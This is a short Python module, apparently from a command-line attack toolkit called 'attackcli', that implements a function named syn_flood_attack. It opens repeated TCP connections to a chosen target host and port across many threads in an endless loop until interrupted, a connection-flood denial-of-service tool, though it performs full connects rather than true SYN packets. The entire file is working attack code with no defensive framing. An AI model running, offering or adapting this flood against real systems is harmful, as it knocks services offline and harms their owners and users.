import socket

import typer
from rich.progress import Progress, SpinnerColumn

from attackcli.utils.thread_exec import ThreadedExecutor


def _syn_once(target: str, port: int):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((target, port))
        sock.close()
    except socket.error:
        typer.echo(typer.style(f"Connection refused: {target}:{port}", fg=typer.colors.RED))


def syn_flood_attack(target: str, port: int, workers: int) -> None:
    typer.echo(typer.style("[!] To stop Press CTRL+C to stop it.", fg=typer.colors.WHITE, bold=True))
    executor = ThreadedExecutor(max_workers=workers)
    executor.start()
    try:
        with Progress(SpinnerColumn(), transient=True) as progress:
            task = progress.add_task("[cyan]Sending packets...", start=False)
            progress.start_task(task)
            while True:
                executor.submit(_syn_once, target, port)
                progress.update(task)
    except KeyboardInterrupt:
        executor.wait()
